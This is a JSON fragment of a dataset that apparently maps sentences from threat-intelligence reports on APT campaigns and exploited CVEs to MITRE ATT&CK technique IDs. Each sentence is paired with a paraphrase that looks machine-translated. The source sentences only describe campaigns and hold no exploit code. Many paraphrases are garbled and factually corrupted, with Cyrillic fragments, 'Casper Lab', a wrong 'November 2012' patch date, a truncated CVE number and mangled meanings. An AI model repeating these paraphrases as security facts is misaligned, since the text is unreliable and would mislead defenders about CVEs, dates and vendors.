            "en_text": "Observed vulnerabilities include:  CVE-2012-0158  CVE-2017-0199  CVE-2017-8759  CVE-2017-11882       Figure 2: APT40 attack lifecycle  Establish Foothold APT40 uses a variety of malware and tools to establish a foothold, many of which are either publicly available or used by other threat groups",
            "data_text": "Observed vulnerabilities include: CVE-2012-0158 CVE-2017-0199 CVE-2017-8759 CVE-2017-11882 Figure 2: APT40 Attack Lifetime Installation Foothold APT40 uses various malware and support tools, many of which are either publicly available or used by other threat groups"
        }
    ],
    "On October 10, 2017, Kaspersky Lab’s advanced exploit prevention systems identified a new Adobe Flash zero day exploit used in the wild against our customers": [
        {
            "tec_id": "T1203",
            "en_text": "On October 10, 2017, Kaspersky Lab’s advanced exploit prevention systems identified a new Adobe Flash zero day exploit used in the wild against our customers",
            "data_text": "On October 10, 2017, advanced Casper Lab prevention systems defined a new zero-day Adobe Flash operating mode used in the wild against our customers."
        }
    ],
    "We are also highly confident that BlackOasis was also responsible for another zero day exploit (CVE-2017-8759) discovered by FireEye in September 2017.  The FinSpy payload used in the current attacks (CVE-2017-11292) shares the same command and control (C2) server as the payload used with CVE-2017-8759 uncovered by FireEye": [
        {
            "tec_id": "T1203",
            "en_text": "We are also highly confident that BlackOasis was also responsible for another zero day exploit (CVE-2017-8759) discovered by FireEye in September 2017.  The FinSpy payload used in the current attacks (CVE-2017-11292) shares the same command and control (C2) server as the payload used with CVE-2017-8759 uncovered by FireEye",
            "data_text": "We are also confident that BlackOasis is also responsible for another zero-day operation (CVE-2017-8759) discovered by FireEye in September 2017. When using the finSpi file in the current attacks (CVE-2017-11292) the same management server (C2) as the CVE-2017-8759 load detected by FireEye is used."
        }
    ],
    "Some lure documents used in these attacks are shown below: Decoy documents used in BlackOasis attacks To summarize, we have seen BlackOasis utilizing at least five zero days since June 2015:  CVE-2015-5119 – June 2015 CVE-2016-0984 – June 2015 CVE-2016-4117 – May 2016 CVE-2017-8759 – Sept 2017 CVE-2017-11292 – Oct 2017  Attacks Leveraging CVE-2017-11292 The attack begins with the delivery of an Office document, presumably in this instance via e-mail.  Embedded within the document is an ActiveX object which contains the Flash exploit": [
        {
            "tec_id": "T1203",
            "en_text": "Some lure documents used in these attacks are shown below: Decoy documents used in BlackOasis attacks To summarize, we have seen BlackOasis utilizing at least five zero days since June 2015:  CVE-2015-5119 – June 2015 CVE-2016-0984 – June 2015 CVE-2016-4117 – May 2016 CVE-2017-8759 – Sept 2017 CVE-2017-11292 – Oct 2017  Attacks Leveraging CVE-2017-11292 The attack begins with the delivery of an Office document, presumably in this instance via e-mail.  Embedded within the document is an ActiveX object which contains the Flash exploit",
            "data_text": "Below are some bait used in the attack : Подводные, the documents used in the attacks BlackOasis In conclusion, we see that BlackOasis is not less than five days from June 2015 : CVE-2015-5119 – June 2015 CVE-2016-0984 – June 2015 CVE-2016-4117 – May 2016 CVE-2017-8759 – September 2017 CVE-2017-11292 – Oct 2017 Assault CVE-2017-11292 the start of the документав this случа.e-mail. Embedded ActiveX object containing Flash output"
        }
    ],
    "What does it mean for everyone and how to defend against such attacks, including zero-day exploits? For CVE-2017-11292 and other similar vulnerabilities, one can use the killbit for Flash within their organizations to disable it in any applications that respect it.  Unfortunately, doing this system-wide is not easily done, as Flash objects can be loaded in applications that potentially do not follow the killbit": [
        {
            "tec_id": "T1203",
            "en_text": "What does it mean for everyone and how to defend against such attacks, including zero-day exploits? For CVE-2017-11292 and other similar vulnerabilities, one can use the killbit for Flash within their organizations to disable it in any applications that respect it.  Unfortunately, doing this system-wide is not easily done, as Flash objects can be loaded in applications that potentially do not follow the killbit",
            "data_text": "What does this mean for everyone and how to protect against such attacks, including zero-day exploitation? For CVE-2017-11292 and other similar vulnerabilities, you can use killbit for Flash in your organizations to disable it in any applications that respect it. Unfortunately, it's not easy to do as Flash objects can be loaded into applications that potentially don't follow killbit"
        }
    ],
    "This document exploited a newer vulnerability, CVE-2017-0199": [
        {
            "tec_id": "T1203",
            "en_text": "This document exploited a newer vulnerability, CVE-2017-0199",
            "data_text": "This document exploited the new vulnerability CVE-2017-0199"
        }
    ],
    "This change is because Group 123 did not target South Korea during this campaign and Microsoft Office is standard in the rest of the world.Infection VectorsThe attackers exploited CVE-2017-0199 in order to download and execute a malicious HTA document inside of Microsoft Office": [
        {
            "tec_id": "T1203",
            "en_text": "This change is because Group 123 did not target South Korea during this campaign and Microsoft Office is standard in the rest of the world.Infection VectorsThe attackers exploited CVE-2017-0199 in order to download and execute a malicious HTA document inside of Microsoft Office",
            "data_text": "This change is because Group 123 is not targeted at South Korea during this campaign and Microsoft Office is standard in the rest of the world.Infectious vectors Attackers used CVE-2017-0199 to download and execute malicious HTA document inside Microsoft Office"
        }
    ],
    "Even when we observed LuckyMouse using weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors since December 2017), we can´t prove they were related to this particular attack": [
        {
            "tec_id": "T1203",
            "en_text": "Even when we observed LuckyMouse using weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors since December 2017), we can´t prove they were related to this particular attack",
            "data_text": "Even when we watched LuckyMouse use armed documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese actors since December 2017), we cannot prove that they were related to this particular attack."
        }
    ],
    "This time, weaponized lure documents claiming to contain seminar information on environmental protection were observed exploiting known Microsoft Office vulnerabilities CVE-2017-0199 and CVE-2017-11882 to drop and execute the backdoor binary on the victim’s machine": [
        {
            "tec_id": "T1203",
            "en_text": "This time, weaponized lure documents claiming to contain seminar information on environmental protection were observed exploiting known Microsoft Office vulnerabilities CVE-2017-0199 and CVE-2017-11882 to drop and execute the backdoor binary on the victim’s machine",
            "data_text": "This time, armed decoys claiming to contain environmental protection information were spotted using known Microsoft Office vulnerabilities CVE-2017-0199 and CVE-2017-11882 to reset and execute the binary backdoor on the victim's machine."
        }
    ],
    "In this campaign, we observed threat actors exploiting CVE-2017-0199 and CVE-2017-11882 to distribute malware": [
        {
            "tec_id": "T1203",
            "en_text": "In this campaign, we observed threat actors exploiting CVE-2017-0199 and CVE-2017-11882 to distribute malware",
            "data_text": "During this campaign, we observed how threat actors exploit CVE-2017-0199 and CVE-2017-11882 to spread malware"
        }
    ],
    "Conclusion CVE-2017-0199 and CVE-2017-11882 are two of the more commonly exploited vulnerabilities that we are currently seeing": [
        {
            "tec_id": "T1203",
            "en_text": "Conclusion CVE-2017-0199 and CVE-2017-11882 are two of the more commonly exploited vulnerabilities that we are currently seeing",
            "data_text": "Conclusion CVE-2017-0199 and CVE-2017-11882 are the two most frequently exploited vulnerabilities we see today"
        }
    ],
    "Figure 2: Zyklon attack flow Infection Techniques CVE-2017-8759 This vulnerability was discovered by FireEye in September 2017, and it is a vulnerability we have observed being exploited in the wild": [
        {
            "tec_id": "T1203",
            "en_text": "Figure 2: Zyklon attack flow Infection Techniques CVE-2017-8759 This vulnerability was discovered by FireEye in September 2017, and it is a vulnerability we have observed being exploited in the wild",
            "data_text": "Figure 2: Cyclone Infection Technologies CVE-2017-8759 This vulnerability was discovered by FireEye in September 2017, and it is a vulnerability we observed exploited in the wild"
        }
    ],
    "Figure 3: Embedded URL in OLE object CVE-2017-11882 Similarly, we have also observed actors leveraging another recently discovered vulnerability (CVE-2017-11882) in Microsoft Office": [
        {
            "tec_id": "T1203",
            "en_text": "Figure 3: Embedded URL in OLE object CVE-2017-11882 Similarly, we have also observed actors leveraging another recently discovered vulnerability (CVE-2017-11882) in Microsoft Office",
            "data_text": "Figure 3: Built-in URL to OLE object CVE-2017-11882 Similarly, we also observed how actors use another recently discovered vulnerability (CVE-2017-11882) in Microsoft Office"
        }
    ],
    "In many cases, additional stealers, RATs, and other malware were observed being hosted on the same web servers.Analysis of HawkEye Reborn The campaign starts with sending the aforementioned Excel sheets that exploit the well-known CVE-2017-11882 vulnerability, an arbitrary code execution bug in Microsoft Office": [
        {
            "tec_id": "T1203",
            "en_text": "In many cases, additional stealers, RATs, and other malware were observed being hosted on the same web servers.Analysis of HawkEye Reborn The campaign starts with sending the aforementioned Excel sheets that exploit the well-known CVE-2017-11882 vulnerability, an arbitrary code execution bug in Microsoft Office",
            "data_text": "In many cases, additional thefts, RATs, and other malware were observed on the same web servers.HawkEye Analysis The revived campaign begins with sending the aforementioned Excel sheets that exploit the known vulnerability CVE-2017-11882 - an arbitrary code execution error in Microsoft Office"
        }
    ],
    "Less than a week after Microsoft issued a patch for CVE-2017-11882 on Nov": [
        {
            "tec_id": "T1203",
            "en_text": "Less than a week after Microsoft issued a patch for CVE-2017-11882 on Nov",
            "data_text": "Less than a week after Microsoft patch release for CVE-2017-11882 in November 2012"
        }
    ],
    "14, 2017, FireEye observed an attacker using an exploit for the Microsoft Office vulnerability to target a government organization in the Middle East": [
        {
            "tec_id": "T1203",
            "en_text": "14, 2017, FireEye observed an attacker using an exploit for the Microsoft Office vulnerability to target a government organization in the Middle East",
            "data_text": "14, 2017, FireEye observed an attacker using a Microsoft Office vulnerability to attack a government organization in the Middle East"
        }
    ],
    "In this latest campaign, APT34 leveraged the recent Microsoft Office vulnerability CVE-2017-11882 to deploy POWRUNER and BONDUPDATER": [
        {
            "tec_id": "T1203",
            "en_text": "In this latest campaign, APT34 leveraged the recent Microsoft Office vulnerability CVE-2017-11882 to deploy POWRUNER and BONDUPDATER",
            "data_text": "In this latest campaign, APT34 exploited the latest Microsoft Office vulnerability CVE-2017-11882 to deploy POWRUNER and BONDUPDATER"
        }
    ],
    "CVE-2017-11882: Microsoft Office Stack Memory Corruption Vulnerability CVE-2017-11882 affects several versions of Microsoft Office and, when exploited, allows a remote user to run arbitrary code in the context of the current user as a result of improperly handling objects in memory": [
        {
            "tec_id": "T1203",
            "en_text": "CVE-2017-11882: Microsoft Office Stack Memory Corruption Vulnerability CVE-2017-11882 affects several versions of Microsoft Office and, when exploited, allows a remote user to run arbitrary code in the context of the current user as a result of improperly handling objects in memory",
            "data_text": "CVE-2017-11882: Microsoft Office Stack Memory Corruption Vulnerability CVE-2017-11882 Affects Multiple Versions of Microsoft Office and, in Operation, Enables Remote User to Run Arbitrary Code in the Context of Current User as a Result of Improper Processing of Objects in Memory"
        }
    ],
    "Figure 3: CVE-2017-11882 and POWRUNER attack sequence  The malicious .rtf file exploits CVE-2017-11882": [
        {
            "tec_id": "T1203",
            "en_text": "Figure 3: CVE-2017-11882 and POWRUNER attack sequence  The malicious .rtf file exploits CVE-2017-11882",
            "data_text": "Figure 3: CVE-2017-11882 and POWRUNER Attacks Malicious File Sequence .rtf Operates CVE-2017-11882"
        }
    ],
    "An RTF, an MSI file, a .NET Wrapper and two stages of Shellcode walk into a bar… Our journey begins with an RTF file named “New Salary Structure 2017.doc”, which exploits CVE-2017-0199": [
        {
            "tec_id": "T1203",
            "en_text": "An RTF, an MSI file, a .NET Wrapper and two stages of Shellcode walk into a bar… Our journey begins with an RTF file named “New Salary Structure 2017.doc”, which exploits CVE-2017-0199",
            "data_text": "RTF, MSI file, .NET Wrapper and two stages of Shellcode going to the bar… Our path starts with an RTF file called \"New Wage 2017-doc\", which uses CVE-2017-0199"
        }
    ],
    "Second, the threat actors exploit CVE-2017-8570 to achieve code execution via a malicious “scriptlet” file, or .sct file, which is also embedded in the malicious RTF document": [
        {
            "tec_id": "T1203",
            "en_text": "Second, the threat actors exploit CVE-2017-8570 to achieve code execution via a malicious “scriptlet” file, or .sct file, which is also embedded in the malicious RTF document",
            "data_text": "Second, threat actors use CVE-2017-8570 to execute code through a malicious \"scriptlet\" file, or a .sct file, which is also embedded in a malicious RTF document."
        }
    ],
    "Older documents used by Patchwork focused on the CVE-2017-0261 vulnerability, however in late January 2018 when, paradoxically, newer documents abandoned this vulnerability to attack the older CVE-2015-2545 vulnerability": [
        {
            "tec_id": "T1203",
            "en_text": "Older documents used by Patchwork focused on the CVE-2017-0261 vulnerability, however in late January 2018 when, paradoxically, newer documents abandoned this vulnerability to attack the older CVE-2015-2545 vulnerability",
            "data_text": "Old documents used by Patchwork focused on vulnerabilities CVE-2017-0261, however in late January 2018, when, paradoxically, new documents abandoned this vulnerability to attack the old vulnerability CVE-2015-245"
        }
    ],
    "Try to exploit the following Remote Code Execution vulnerabilities in the targeted servers:  a) CVE-2012-0874: JBoss Enterprise Application Platform Multiple Security Bypass Vulnerabilities b) CVE-2010-1871: JBoss Seam Framework remote code execution c) JBoss AS 3/4/5/6: Remote Command Execution (exploit) d) CVE-2017-10271: Oracle WebLogic wls-wsat Component Deserialization RCE e) CVE-2018-2894: Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware": [
        {
            "tec_id": "T1203",
            "en_text": "Try to exploit the following Remote Code Execution vulnerabilities in the targeted servers:  a) CVE-2012-0874: JBoss Enterprise Application Platform Multiple Security Bypass Vulnerabilities b) CVE-2010-1871: JBoss Seam Framework remote code execution c) JBoss AS 3/4/5/6: Remote Command Execution (exploit) d) CVE-2017-10271: Oracle WebLogic wls-wsat Component Deserialization RCE e) CVE-2018-2894: Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware",
            "data_text": "Try using the vulnerability in the implementation of the remote code on the target servers : (a) CVE-2012-0874, JBoss Enterprise Application Platform Multiple Bypass Vulnerability (b) CVE-2010-1871, JBoss Seam \" Remote Code execution (c) JBoss of 3/4/5/6, Remote Command Execution (Exploit) (d) CVE-2017-10271, Oracle WebLogic wls-wsat the Deserialization RCE (e) CVE-2018-2894, vulnerability. in Oracle WebLogic Server component from Oracle Fusion Middleware"
        }
    ],
    "Attack chain of Tropic Trooper’s operations Here’s a summary of the attack chain of Tropic Trooper’s recent campaigns:  Execute a command through exploits for CVE-2017-11882 or CVE-2018-0802, security flaws in Microsoft Office’s Equation Editor (EQNEDT32.EXE)": [
        {
            "tec_id": "T1203",
            "en_text": "Attack chain of Tropic Trooper’s operations Here’s a summary of the attack chain of Tropic Trooper’s recent campaigns:  Execute a command through exploits for CVE-2017-11882 or CVE-2018-0802, security flaws in Microsoft Office’s Equation Editor (EQNEDT32.EXE)",
            "data_text": "Here is a brief description of the chain of attacks carried out by Tropic Trooper recently. Execute the command through the use for CVE-2017-11882 or CVE-2018-0802, security flaws in the Microsoft Office Equation Editor (EQNEDT32.Yes)"
        }
    ],
    "We believe the adversary exploited a recently vulnerability in Microsoft SharePoint tracked by , which is a remote code execution vulnerability used to compromise the server and eventually install a webshell": [
        {
            "tec_id": "T1203",
            "en_text": "We believe the adversary exploited a recently vulnerability in Microsoft SharePoint tracked by , which is a remote code execution vulnerability used to compromise the server and eventually install a webshell",
            "data_text": "We believe the adversary has recently exploited a vulnerability in Microsoft SharePoint tracked by , which is a remote code execution vulnerability used to compromise the server and eventually install a web shell"
        }
    ],
    "The attack involved the new HAWKBALL backdoor being delivered via well-known Microsoft Office vulnerabilities CVE-2017-11882 and CVE-2018-0802.": [
        {
            "tec_id": "T1203",
            "en_text": "The attack involved the new HAWKBALL backdoor being delivered via well-known Microsoft Office vulnerabilities CVE-2017-11882 and CVE-2018-0802.",
            "data_text": "As a result of the attack, a new backdoor HAWKBALL was implemented, which is delivered through known Microsoft Office vulnerabilities CVE-2017-11882 and CVE-2018-0802."
        }
    ],
    "Exploited Vulnerabilities: Frequent exploitation of vulnerabilities in Hangul Word Processor (HWP), as well as Adobe Flash": [
        {
            "tec_id": "T1068",
            "en_text": "Exploited Vulnerabilities: Frequent exploitation of vulnerabilities in Hangul Word Processor (HWP), as well as Adobe Flash",
            "data_text": "Exploited Vulnerability Frequent exploitation of vulnerabilities in Hangul Word Processor (HWP), as well as Adobe Flash"
        }
    ],
    "APT40 leverages exploits in their phishing operations, often weaponizing vulnerabilities within days of their disclosure": [
        {
            "tec_id": "T1068",
            "en_text": "APT40 leverages exploits in their phishing operations, often weaponizing vulnerabilities within days of their disclosure",
            "data_text": "APT40 leverages operational capabilities in their phishing operations, often arming vulnerabilities within days of their disclosure"
        }
    ],
    "Leveraging data from Kaspersky Security Network, we identified two other similar exploit chains used by BlackOasis in June 2015 which were zero days at the time.  Those include CVE-2015-5119 and CVE-2016-0984, which were patched in July 2015 and February 2016 respectively.  These exploit chains also delivered FinSpy installation packages": [
        {
            "tec_id": "T1068",
            "en_text": "Leveraging data from Kaspersky Security Network, we identified two other similar exploit chains used by BlackOasis in June 2015 which were zero days at the time.  Those include CVE-2015-5119 and CVE-2016-0984, which were patched in July 2015 and February 2016 respectively.  These exploit chains also delivered FinSpy installation packages",
            "data_text": "Using data from Kaspersky Security Network, we discovered two other similar operating chains used by BlackOasis in June 2015, which were zero days at the time. Among them are CVE-2015-5119 and CVE-2016-0984, which were copied in July 2015 and February 2016, respectively. These chains also supplied FinSpy installation packages"
        }
    ],
    "Deploying a multi-layered approach including access policies, anti-virus, network monitoring and whitelisting can help ensure customers are protected against threats such as this.  Users of Kaspersky products are protected as well against this threat by one of the following detections:  PDM:Exploit.Win32.Generic HEUR:Exploit.SWF.Generic HEUR:Exploit.MSOffice.Generic  More information about BlackOasis APT is available to customers of Kaspersky Intelligence Reporting Service": [
        {
            "tec_id": "T1068",
            "en_text": "Deploying a multi-layered approach including access policies, anti-virus, network monitoring and whitelisting can help ensure customers are protected against threats such as this.  Users of Kaspersky products are protected as well against this threat by one of the following detections:  PDM:Exploit.Win32.Generic HEUR:Exploit.SWF.Generic HEUR:Exploit.MSOffice.Generic  More information about BlackOasis APT is available to customers of Kaspersky Intelligence Reporting Service",
            "data_text": "Deploying a multi-layered approach that includes access policy, antivirus, network monitoring, and whitelist can help provide protection for customers against such threats. Caspersky product users are also protected from this threat by one of the following detectives: PDM:Exploit.Win32.Generic HEUR: Take advantage.S.F. Generic Care: Take advantage.MSOffice.More information about BlackOasis APT can be obtained from Casper Intelligence reporting customers"
        }
    ],
    "Exploitation of this vulnerability allows an attacker to escalate privileges on the affected system": [
        {
            "tec_id": "T1068",
            "en_text": "Exploitation of this vulnerability allows an attacker to escalate privileges on the affected system",
            "data_text": "Exploitation of this vulnerability allows an attacker to extend the rights to the vulnerable system"
        }
    ],
    "All zero-day exploits known, or suspected, to have been used by this group are for vulnerabilities in Internet Explorer and Flash": [
        {
            "tec_id": "T1068",
            "en_text": "All zero-day exploits known, or suspected, to have been used by this group are for vulnerabilities in Internet Explorer and Flash",
            "data_text": "All known or suspected zero-day exploits have been used by this group, intended for vulnerabilities in Internet Explorer and Flash."
        }
    ],
    "Year  Country  Industry  Malware  2014  Vietnam  Network Security  WINDSHIELD  2014  Germany  Manufacturing  WINDSHIELD  2015  Vietnam  Media  WINDSHIELD  2016  Philippines  Consumer products  KOMPROGO WINDSHIELD SOUNDBITE BEACON   2016  Vietnam  Banking  WINDSHIELD  2016  Philippines  Technology Infrastructure  WINDSHIELD  2016  China  Hospitality  WINDSHIELD  2016  Vietnam  Media  WINDSHIELD  2016  United States  Consumer Products  WINDSHIELD PHOREAL BEACON SOUNDBITE  Table 1: APT32 Private Sector Targeting Identified by FireEye APT32 Interest in Political Influence and Foreign Governments In addition to focused targeting of the private sector with ties to Vietnam, APT32 has also targeted foreign governments, as well as Vietnamese dissidents and journalists since at least 2013": [
        {
            "tec_id": "T1068",
            "en_text": "Year  Country  Industry  Malware  2014  Vietnam  Network Security  WINDSHIELD  2014  Germany  Manufacturing  WINDSHIELD  2015  Vietnam  Media  WINDSHIELD  2016  Philippines  Consumer products  KOMPROGO WINDSHIELD SOUNDBITE BEACON   2016  Vietnam  Banking  WINDSHIELD  2016  Philippines  Technology Infrastructure  WINDSHIELD  2016  China  Hospitality  WINDSHIELD  2016  Vietnam  Media  WINDSHIELD  2016  United States  Consumer Products  WINDSHIELD PHOREAL BEACON SOUNDBITE  Table 1: APT32 Private Sector Targeting Identified by FireEye APT32 Interest in Political Influence and Foreign Governments In addition to focused targeting of the private sector with ties to Vietnam, APT32 has also targeted foreign governments, as well as Vietnamese dissidents and journalists since at least 2013",
            "data_text": "A year Country of malware 2014 the Vietnam network, you know, WINDSHIELD 2014 Germany since WINDSHIELD by Вьетнамские the media WINDSHIELD 2016, the Philippines Consumer products KOMPROGO WINDSHIELD the sound ... ... 2016 Vietnamese банкинг WINDSHIELD 2016 Philippine technological infrastructure WINDSHIELD 2016 China hospitality ВИДШИЕЛД 2016 Вьетнамские the media ВИДШИЕЛД 2016 the US consumer WINDS.HIELD PHOREAL BEACON Sound Table 1: APT32 Interest in the political influence and governments of foreign governments, as well as Vietnamese dissidents and journalists since 2013, at least,"
        }
    ],
    "APT32 regularly used stealthy techniques to blend in with legitimate user activity:  During one investigation, APT32 was observed using a privilege escalation exploit (CVE-2016-7255) masquerading as a Windows hotfix": [
        {
            "tec_id": "T1068",
            "en_text": "APT32 regularly used stealthy techniques to blend in with legitimate user activity:  During one investigation, APT32 was observed using a privilege escalation exploit (CVE-2016-7255) masquerading as a Windows hotfix",
            "data_text": "APT32 regularly applied hidden methods to mix with legitimate user activity: During one study, APT32 was seen using the privilege of extension (CVE-2016-7255) masked as a Windows fix"
        }
    ],
    "Documents with the Flash exploit managed to evade static defenses and remain undetected as an exploit on VirusTotal": [
        {
            "tec_id": "T1068",
            "en_text": "Documents with the Flash exploit managed to evade static defenses and remain undetected as an exploit on VirusTotal",
            "data_text": "Documents from the Flash utility managed to avoid static defense and remain unnoticed as a means of exploitation on VirusTotal"
        }
    ],
    "McAfee detects these threats as:  RDN/Generic Exploit RDN/Generic.dx Generic PWS.y Generic.hbg Exploit-CVE2018-4878  McAfee customers are also covered by McAfee Global Threat Intelligence Web Reputation classification, which rate these URLs as High Risk": [
        {
            "tec_id": "T1068",
            "en_text": "McAfee detects these threats as:  RDN/Generic Exploit RDN/Generic.dx Generic PWS.y Generic.hbg Exploit-CVE2018-4878  McAfee customers are also covered by McAfee Global Threat Intelligence Web Reputation classification, which rate these URLs as High Risk",
            "data_text": "McAfee detects these threats as RDN/Generic Exploit RDN/Generic.dx Generic PWS.y Generic.hbg Exploit-CVE2018-4878 McAfee customers are also covered by the McAfee Global Threat Intelligence Web Reputation classification, which evaluates these URLs as high-risk"
        }
    ],
    "The database is located in the “/usr/lib/cva-ssys/My_BD” folder (“~/.local/cva-ssys/My_BD”—if the Trojan does not have root privileges)": [
        {
            "tec_id": "T1068",
            "en_text": "The database is located in the “/usr/lib/cva-ssys/My_BD” folder (“~/.local/cva-ssys/My_BD”—if the Trojan does not have root privileges)",
            "data_text": "The database is located in the folder \"/usr/lib/cva-ssys/My_BD\" (\"~/.local/cva-ssys/My_BD\"—if the Trojan does not have root privileges)"
        }
    ],
    "The attacker leveraged multiple exploits, targeting both CVE-2014-6332 and CVE-2014-4113": [
        {
            "tec_id": "T1068",
            "en_text": "The attacker leveraged multiple exploits, targeting both CVE-2014-6332 and CVE-2014-4113",
            "data_text": "The attacker used several types of exploitation targeted at both CVE-2014-6332 and CVE-2014-4113"
        }
    ],
    "CVE-2014-4113 is a privilege escalation vulnerability that was disclosed publicly on 2014-10-14": [
        {
            "tec_id": "T1068",
            "en_text": "CVE-2014-4113 is a privilege escalation vulnerability that was disclosed publicly on 2014-10-14",
            "data_text": "CVE-2014-4113 is a vulnerability that was made public in 2014-10-14."
        }
    ],
    "The first dropped file, doc.exe, contains the CVE-2014-4113 exploit and then attempts to execute test.exe with the elevated privileges": [
        {
            "tec_id": "T1068",
            "en_text": "The first dropped file, doc.exe, contains the CVE-2014-4113 exploit and then attempts to execute test.exe with the elevated privileges",
            "data_text": "The first doc.exe file contains Exploit CVE-2014-4113 and then attempts to run test.exe with elevated privileges"
        }
    ],
    "Are the attackers using any zero-day vulnerabilities? No zero-day vulnerabilities have been found in the analysis of the samples obtained regarding this campaign": [
        {
            "tec_id": "T1068",
            "en_text": "Are the attackers using any zero-day vulnerabilities? No zero-day vulnerabilities have been found in the analysis of the samples obtained regarding this campaign",
            "data_text": "Do attackers exploit vulnerabilities during day zero? No zero-day vulnerabilities were detected when analyzing the samples received for this campaign."
        }
    ],
    "These vulnerabilities were patched last December 28 2015, April 5, 2016, and May 12, 2016, respectively": [
        {
            "tec_id": "T1068",
            "en_text": "These vulnerabilities were patched last December 28 2015, April 5, 2016, and May 12, 2016, respectively",
            "data_text": "These vulnerabilities were fixed last December 28, 2015, April 5, 2016, and May 12, 2016, respectively."
        }
    ],
    "Trend Micro Solutions Trend Micro™ Deep Security™ and Vulnerability Protection provide virtual patching that protects endpoints from threats such as malicious redirections to malware-hosting URLs, as well as those that exploit unpatched vulnerabilities": [
        {
            "tec_id": "T1068",
            "en_text": "Trend Micro Solutions Trend Micro™ Deep Security™ and Vulnerability Protection provide virtual patching that protects endpoints from threats such as malicious redirections to malware-hosting URLs, as well as those that exploit unpatched vulnerabilities",
            "data_text": "Trend Micro Solutions Trend Micro™ Deep Security™ and Vulnerability Protection provide a virtual patch that protects endpoints from threats such as malicious redirects to URLs hosting malicious programs, as well as those exploiting unpackable vulnerabilities."
        }
    ],
    "OfficeScan’s Vulnerability Protection shields endpoints from identified and unknown vulnerability exploits even before patches are even deployed. Trend Micro™ Deep Discovery™ provides detection, in-depth analysis, and proactive response to attacks using exploits and other similar threats through specialized engines, custom sandboxing, and seamless correlation across the entire attack lifecycle, allowing it to detect these attacks even without any engine or pattern update": [
        {
            "tec_id": "T1068",
            "en_text": "OfficeScan’s Vulnerability Protection shields endpoints from identified and unknown vulnerability exploits even before patches are even deployed. Trend Micro™ Deep Discovery™ provides detection, in-depth analysis, and proactive response to attacks using exploits and other similar threats through specialized engines, custom sandboxing, and seamless correlation across the entire attack lifecycle, allowing it to detect these attacks even without any engine or pattern update",
            "data_text": "Trend Micro™ Deep Discovery™ provides detection, in-depth analysis and proactive response to attacks using operational and other similar threats through specialized engines, custom sanding and seamless systems. correlation throughout the attack lifecycle, allowing it to detect these attacks even without engine or template updates."
        }
    ],
    "Dubbed ‘SpeakUp’, the new Trojan exploits known vulnerabilities in six different Linux distributions": [
        {
            "tec_id": "T1068",
            "en_text": "Dubbed ‘SpeakUp’, the new Trojan exploits known vulnerabilities in six different Linux distributions",
            "data_text": "Added 'SpeakUp', new Trojan version exploits known vulnerabilities in six different Linux distributions"
        }
    ],
    "exploits a known Windows privilege escalation vulnerability ( ) on unpatched computers.": [
        {
            "tec_id": "T1068",
            "en_text": "exploits a known Windows privilege escalation vulnerability ( ) on unpatched computers.",
            "data_text": "exploits a known Windows Privilege Escalation vulnerability ( ) on non-pached computers."
        }
    ],
    "Among them, we found variations on the    EternalDarkness SMBv3 exploit (CVE-2020-0796)  , a , the privilege escalation exploit published on the Google Security Github account, and the privilege escalation exploit.": [
        {
            "tec_id": "T1068",
            "en_text": "Among them, we found variations on the    EternalDarkness SMBv3 exploit (CVE-2020-0796)  , a , the privilege escalation exploit published on the Google Security Github account, and the privilege escalation exploit.",
            "data_text": "Among them, options were found to use EternalDarkness SMBv3 (CVE-2020-0796) , , , the privilege extension utility published on the Google Security Github account, and exploit the privilege extension."
        }
    ],
    "A 2016 Novetta report detailed the work of security vendors attempting to unveil tools and infrastructure related to the 2014 destructive attack against Sony Pictures Entertainment": [
        {
            "tec_id": "T1518.001",
            "en_text": "A 2016 Novetta report detailed the work of security vendors attempting to unveil tools and infrastructure related to the 2014 destructive attack against Sony Pictures Entertainment",
            "data_text": "In November 2016, a detailed work was done by security providers trying to uncover tools and infrastructure related to the devastating attack on Sony Pictures Entertainment in 2014."
        }
    ],
    "Detecting Avast  A unique feature of this latest Astaroth Trojan campaign is the malware's ability to search for specific security products and exploit them": [
        {
            "tec_id": "T1518.001",
            "en_text": "Detecting Avast  A unique feature of this latest Astaroth Trojan campaign is the malware's ability to search for specific security products and exploit them",
            "data_text": "Avast Tracking The unique feature of this latest Astaroth Trojan campaign is the ability of malware to search for specific security products and use them"
        }
    ],
    "The analysis of the tools and techniques used in the Astaroth campaign show how truly effective LOLbins are at evading antivirus products": [
        {
            "tec_id": "T1518.001",
            "en_text": "The analysis of the tools and techniques used in the Astaroth campaign show how truly effective LOLbins are at evading antivirus products",
            "data_text": "Analysis of the tools and methods used in the Astarot campaign shows how effective LOLbins are in avoiding antivirus products."
        }
    ],
    "Tools CTU researchers observed BRONZE UNION using the following tools in intrusions since the 2015 analysis, but clients should assume that the threat group still has access to the previously reported tools": [
        {
            "tec_id": "T1518.001",
            "en_text": "Tools CTU researchers observed BRONZE UNION using the following tools in intrusions since the 2015 analysis, but clients should assume that the threat group still has access to the previously reported tools",
            "data_text": "Tools CTU researchers have observed that BRONZE UNION has been using the following tools for intrusions since the 2015 analysis, but customers should assume that the threat group still has access to previously reported tools."
        }
    ],
    "Organizations that Buckeye targeted over time, per region Malware and tools Buckeye uses a number of hacking tools as well as malware": [
        {
            "tec_id": "T1518.001",
            "en_text": "Organizations that Buckeye targeted over time, per region Malware and tools Buckeye uses a number of hacking tools as well as malware",
            "data_text": "Organizations that Buckeye targeted over time by Malware regions and tools Buckeye uses a number of hacker tools as well as malware"
        }
    ],
    "In doing so, it will attempt to detect the following Anti-Virus products via various techniques:  Trend Micro Kaspersky Symantec Avira AVG ALYac Ahnlab  Ahnlab and ALYac are the most widely used Anti-Virus solutions in South Korea, and Trend Micro and the rest are also known to be most widely used in Taiwan": [
        {
            "tec_id": "T1518.001",
            "en_text": "In doing so, it will attempt to detect the following Anti-Virus products via various techniques:  Trend Micro Kaspersky Symantec Avira AVG ALYac Ahnlab  Ahnlab and ALYac are the most widely used Anti-Virus solutions in South Korea, and Trend Micro and the rest are also known to be most widely used in Taiwan",
            "data_text": "In doing so, it will try to detect the following antivirus products using various methods: Trend Micro Kaspersky Symantec Avira AVG ALYac Ahnlab and ALYac are the most widely used antivirus solutions in South Korea, and Trend Micro and others are also known to be the most widely used in Taiwan."
        }
    ],
    "When combined with email tracking software, APT32 was able to closely track phishing delivery, success rate, and conduct further analysis about victim organizations while monitoring the interest of security firms": [
        {
